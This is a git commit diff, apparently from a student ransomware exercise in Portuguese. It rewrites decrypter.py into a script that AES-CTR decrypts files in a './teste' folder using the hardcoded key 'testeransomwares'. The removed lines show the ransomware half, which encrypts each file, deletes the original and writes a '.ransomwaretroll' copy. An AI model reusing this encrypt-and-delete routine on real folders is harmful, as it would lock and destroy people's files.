e46ed0cbeea20e1ad7e5107cff48e393412afcda
Jakelini Engel <39855478+jakeliniengel@users.noreply.github.com>
2025-01-27 18:36:36 -0300

    Update decrypter.py
    Faz um Decrypt de todos os arquivos encryptados da pasta. 
    Decrypt apenas para txt por enquanto

--- decrypter.py
+++ decrypter.py
@@ -1,33 +1,30 @@
 import os
 import pyaes
 
+
 ## pega todos os arquivos do diretório teste
 arquivos = os.listdir("./teste")
-
-## abrir a pasta com os arquivos a serem criptografados
+##Looping dos arquivos
 for arquivo in arquivos:
-    ##seta variavel com o nome do arquivo e extensão
     filename, file_extension = os.path.splitext(arquivo)
-    ##seta pasta+nome completo do arquivo
     file_name= "./teste/" + str(filename +file_extension)
-    #print(file_name)
-    #abre arquivo
+    
+    ## abrir o arquivo criptografado
+    file_name = file_name
     file = open(file_name, "rb")
-    #Lê arquivo
     file_data = file.read()
-    #Fecha arquivo arquivo
     file.close()
-    ## remover o arquivo
-    os.remove(file_name)
 
-    ## chave de criptografia
+    ## chave para descriptografia
     key = b"testeransomwares"
     aes = pyaes.AESModeOfOperationCTR(key)
-    ##encripta arquivo
-    crypto_data = aes.encrypt(file_data)
+    decrypt_data = aes.decrypt(file_data)
 
-    ## salvar o arquivo criptografado
-    new_file = "./teste/" + filename + ".ransomwaretroll"
-    new_file = open(f'{new_file}','wb')
-    new_file.write(crypto_data)
+    ## remover o arquivo criptografado
+    os.remove(file_name)
+
+    ## criar o arquivo descriptografado
+    new_file = "./teste/" +str(filename)+".txt"
+    new_file = open(f'{new_file}', "wb")
+    new_file.write(decrypt_data)
     new_file.close()
